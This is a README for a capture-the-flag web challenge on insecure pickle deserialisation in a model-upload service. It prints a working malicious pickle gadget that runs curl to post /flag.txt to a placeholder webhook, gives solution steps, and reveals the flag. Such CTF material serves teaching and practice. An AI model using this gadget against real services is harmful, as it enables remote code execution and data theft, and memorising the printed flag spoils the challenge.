# Web Challenge 1 — OpenML: PKL Injection

| Field      | Detail                                       |
|------------|----------------------------------------------|
| Category   | Web / Insecure Deserialization               |
| Difficulty | Medium                                       |
| Points     | 300                                          |
| Port       | 5001                                         |
| Flag       | `ctfupb{0p3nml_5ecur17y_f4iled_t0_4_fr1k1ng_p1ck1e}` |

---

## Challenge description

**OpenML** is a non-profit organisation whose mission is to *"secure AI by
providing free resources to build and train models"*.  The platform lets
researchers upload serialised scikit-learn models (`.pkl`) and evaluate them
against a sample dataset.  The server loads them directly with `pickle.load()`.

Your goal is to achieve remote code execution on the server and exfiltrate
`/flag.txt` to a webhook you control.

**Note:** the flag does not appear in the HTTP response — you must send it out yourself.

---

## Vulnerability

`pickle.load()` calls the `__reduce__` method of the deserialised object.
An attacker who controls the `.pkl` file can run any OS command inside the
server process.

```python
# Minimal gadget
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl -X POST https://your-webhook/ -d $(cat /flag.txt)",))

pickle.dump(Exploit(), open("evil.pkl", "wb"))
```

---

## Why it is safe for concurrent players

* Every upload is stored in a **unique UUID directory** under `/tmp/`.
* Evaluation runs in an **isolated subprocess** with a 15 s timeout.
* The directory is deleted on completion regardless of outcome.
* Players share no workspace — they only race to read the same `/flag.txt`.

---

## Setup

```bash
cd web/reto_pkl_injection
docker compose up --build -d
# Challenge available at http://localhost:5001
```

---

## Solution

```bash
# 1. Point to your webhook (e.g. https://webhook.site)
WEBHOOK="https://webhook.site/your-uuid"

# 2. Generate the payload
python3 solution/gen_payload.py "$WEBHOOK"

# 3. Upload evil_model.pkl via the browser form  →  /evaluate
#    Check your webhook panel for the incoming flag.

# Or run the fully automated exploit:
python3 solution/solve.py http://localhost:5001 "$WEBHOOK"
```
